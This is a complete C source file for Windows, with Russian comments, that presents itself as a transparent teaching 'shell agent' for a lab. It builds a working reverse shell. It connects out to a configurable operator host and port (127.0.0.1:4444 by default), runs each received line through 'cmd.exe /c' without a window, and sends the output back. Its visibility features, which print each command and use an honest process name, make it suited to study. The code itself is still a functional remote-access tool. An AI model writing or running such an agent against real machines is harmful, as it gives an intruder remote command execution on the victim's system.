/* lab-agent.c — учебный shell-агент v0 (лаборатория, прозрачный)
 *
 * Принцип: сокет -> строка команды -> cmd.exe /c с перенаправленным выводом -> обратно.
 * Всё видно: имя процесса честное, каждая команда печатается в его консоль,
 * завершение — команда exit либо Ctrl+C / taskkill.
 *
 * Сборка: gcc -O2 -o lab-agent.exe lab-agent.c -lws2_32
 */
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void finish(SOCKET s, int code) {
    closesocket(s);
    WSACleanup();
    exit(code);
}

int main(int argc, char **argv) {
    const char *host = argc > 1 ? argv[1] : "127.0.0.1";
    unsigned short port = (unsigned short)(argc > 2 ? atoi(argv[2]) : 4444);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        fprintf(stderr, "[lab-agent] WSAStartup failed\n");
        return 1;
    }
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        fprintf(stderr, "[lab-agent] socket failed err=%d\n", WSAGetLastError());
        return 1;
    }

    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &a.sin_addr) != 1) {
        fprintf(stderr, "[lab-agent] bad host: %s\n", host);
        return 1;
    }
    if (connect(s, (struct sockaddr *)&a, sizeof a) != 0) {
        fprintf(stderr, "[lab-agent] connect %s:%u failed err=%d\n",
                host, port, WSAGetLastError());
        finish(s, 1);
    }
    printf("[lab-agent] online -> %s:%u (процесс виден в диспетчере задач)\n", host, port);

    char line[8192];
    for (;;) {
        /* ── читаем одну строку команды байт за байтом ──
           (простейший протокол; его слабости — предмет урока v1) */
        size_t n = 0;
        int link_down = 0;
        while (n < sizeof line - 1) {
            char ch;
            int r = recv(s, &ch, 1, 0);
            if (r == 0 || r == SOCKET_ERROR) { link_down = 1; break; }
            if (ch == '\n') break;
            line[n++] = ch;
        }
        if (link_down) {
            printf("[lab-agent] оператор отключился — завершаемся\n");
            break;
        }
        line[n] = '\0';
        if (n && line[n - 1] == '\r') line[n - 1] = '\0';
        if (!line[0]) continue;

        printf("[lab-agent] cmd: %s\n", line);

        if (strcmp(line, "exit") == 0) {
            send(s, "__END__ exit\n", 13, 0);
            break;
        }

        /* ── пайп: stdout и stderr ребёнка стекаются в ОДИН канал ── */
        SECURITY_ATTRIBUTES sa = { sizeof sa, NULL, TRUE };
        HANDLE rd = NULL, wr = NULL;
        if (!CreatePipe(&rd, &wr, &sa, 0)) {
            send(s, "__END__ pipe_err\n", 17, 0);
            continue;
        }
        SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0); /* наш конец чтения ребёнку не нужен */

        /* cmdline -> UTF-16 */
        char scmd[16400];
        wchar_t wcmd[16384];
        snprintf(scmd, sizeof scmd, "cmd.exe /c %s", line);
        MultiByteToWideChar(CP_UTF8, 0, scmd, -1, wcmd, 16384);

        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        memset(&si, 0, sizeof si);
        memset(&pi, 0, sizeof pi);
        si.cb = sizeof si;
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput  = NULL;
        si.hStdOutput = wr;
        si.hStdError  = wr;

        /* CREATE_NO_WINDOW: каждое консольное действие агента раньше мигало бы чёрным
         * окном на экране. Здесь это чисто анти-мусор лабы: сам агент виден всегда. */
        BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, TRUE,
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(wr); /* критично: закрываем свою копию сразу — иначе ReadFile никогда не увидит EOF */
        if (!ok) {
            DWORD e = GetLastError();
            char msg[64];
            int m = snprintf(msg, sizeof msg, "__END__ createprocess_%lu\n", (unsigned long)e);
            send(s, msg, m, 0);
            CloseHandle(rd);
            continue;
        }

        /* ── перекачиваем вывод ребёнка прямо в сокет, пока пайп не закроется ──
           EOF наступает, когда ребёнок (и все наследники с дескриптором) умрут. */
        char buf[65536];
        DWORD got = 0;
        for (;;) {
            if (!ReadFile(rd, buf, sizeof buf, &got, NULL)) break;
            if (got == 0) break;
            int off = 0;
            while (off < (int)got) {
                int w = send(s, buf + off, got - off, 0);
                if (w == SOCKET_ERROR) break;
                off += w;
            }
        }
        CloseHandle(rd);

        WaitForSingleObject(pi.hProcess, 60000);
        DWORD exitcode = 0;
        GetExitCodeProcess(pi.hProcess, &exitcode);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        char tail[48];
        int t = snprintf(tail, sizeof tail, "__END__ %lu\n", (unsigned long)exitcode);
        if (send(s, tail, t, 0) == SOCKET_ERROR) {
            printf("[lab-agent] сокет умер — завершаемся\n");
            break;
        }
    }

    closesocket(s);
    WSACleanup();
    printf("[lab-agent] stopped\n");
    return 0;
}
